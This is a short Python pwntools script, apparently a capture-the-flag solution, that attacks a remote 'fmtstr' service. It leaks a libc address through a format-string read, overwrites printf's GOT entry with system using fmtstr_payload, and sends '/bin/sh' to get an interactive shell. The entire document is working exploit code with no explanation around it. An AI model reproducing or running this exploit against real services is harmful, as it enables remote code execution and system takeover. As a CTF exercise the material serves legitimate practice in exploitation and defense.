from pwn import *
context.binary = elf = ELF('./fmtstr', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)

#s = remote('localhost', 10000)
s = remote('143.198.127.103', 42002)

s.sendline(b'N')
s.recvuntil(b'Give me your first input:\n')
s.sendline(b'%7$lx')
_IO_file_jumps = int(s.recvline()[:-1], 16)
libc.address = _IO_file_jumps - libc.symbols._IO_file_jumps
print('libc:', hex(libc.address))

payload = fmtstr_payload(6, {elf.got.printf : libc.symbols.system }, numbwritten=0, write_size='short')
s.sendline(payload)
s.sendline(b'/bin/sh')
s.interactive()
